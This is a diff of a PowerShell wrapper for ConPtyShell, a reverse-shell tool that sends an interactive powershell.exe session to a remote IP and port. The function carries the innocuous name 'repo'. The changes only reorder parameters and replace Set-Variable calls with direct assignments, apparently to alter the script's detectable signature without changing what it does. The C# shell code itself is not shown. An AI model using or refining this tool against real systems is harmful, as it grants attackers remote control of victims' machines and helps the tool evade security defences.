@@ -2,21 +2,9 @@ function repo
 {   
     Param
     (
-        [Parameter()]
-        [String]
-        $CommandLine = "powershell.exe",
-
         [Parameter(Position = 0)]
         [String]
         $RemoteIp,
-
-        [Parameter()]
-        [Switch]
-        $Upgrade,
-
-        [Parameter()]
-        [String]
-        $Rows = "24",
 
         [Parameter(Position = 1)]
         [String]
@@ -24,7 +12,19 @@ function repo
 
         [Parameter()]
         [String]
-        $Cols = "80"
+        $Rows = "24",
+
+        [Parameter()]
+        [String]
+        $Cols = "80",
+
+        [Parameter()]
+        [String]
+        $CommandLine = "powershell.exe",
+
+        [Parameter()]
+        [Switch]
+        $Upgrade
     )
 
     if( $PSBoundParameters.ContainsKey('Upgrade') ) {
@@ -41,13 +41,13 @@ function repo
             throw "RemotePort missing parameter"
         }
     }
-    Set-Variable -Name parametersConPtyShell -Value (@($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine))
+    $parametersConPtyShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
     Add-Type -TypeDefinition $Source -Language CSharp;
-    Set-Variable -Name output -Value ([ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell))
+    $output = [ConPtyShellMainClass]::ConPtyShellMain($parametersConPtyShell)
     Write-Output $output
 }
 
-Set-Variable -Name Source -Value (@"
+$Source = @"
 
 using System;
 using System.IO;
@@ -1610,5 +1610,4 @@ class MainClass
     }
 }
 
-"@);
-
+"@;
